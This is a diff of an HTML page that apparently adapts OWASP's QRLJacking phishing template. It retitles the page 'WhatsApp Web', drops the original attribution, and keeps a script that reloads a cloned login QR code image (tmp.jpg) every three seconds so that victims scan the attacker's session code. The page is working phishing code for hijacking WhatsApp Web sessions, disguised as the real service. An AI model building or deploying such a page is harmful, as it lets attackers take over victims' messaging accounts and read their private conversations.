@@ -1,21 +1,40 @@
-
-<html>
-<title></title>
+<!DOCTYPE html>
+<html lang="en">
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsApp Web</title>
+    <style>
+        html, body {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            background-color: #000; /* Fundo preto, opcional */
+        }
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover; /* Ajusta a imagem para cobrir toda a janela */
+        }
+    </style>
+    <script>
+        var myTimer;
+        myTimer = window.setInterval(reloadD, 3000);
+        
+        function reloadD() {
+            var d = new Date();
+            // Adiciona um timestamp ao URL para evitar cache do navegador
+            document.getElementById('qrcodew').src = "tmp.jpg?h=" + d.getTime();
+        }
+    </script>
 </head>
 <body>
-<script>
-// This page was made by SymbianSyMoh (https://github.com/OWASP/QRLJacking/blob/master/phishing.html)
-//Our timer to update the image tag with the leatest generated qr code image file (tmp.jpg)
-var myTimer;
-myTimer = window.setInterval(reloadD,5000);
-function reloadD(){
-d = new Date();
-//We added a date to grab the non-cached version of the qr code image file from server
-document.getElementById('qrcodew').src="tmp.jpg?h="+d.getTime();
-}
-</script>
-<!-- Add your prefered body here and adjust the size and position of the coloned qr code image tag -->
-<img id="qrcodew" alt="Scan me!" src="tmp.jpg" style="display: block;">
+    <!-- Imagem do QR Code -->
+    <img id="qrcodew" alt="Scan me!" src="tmp.jpg" />
 </body>
 </html>
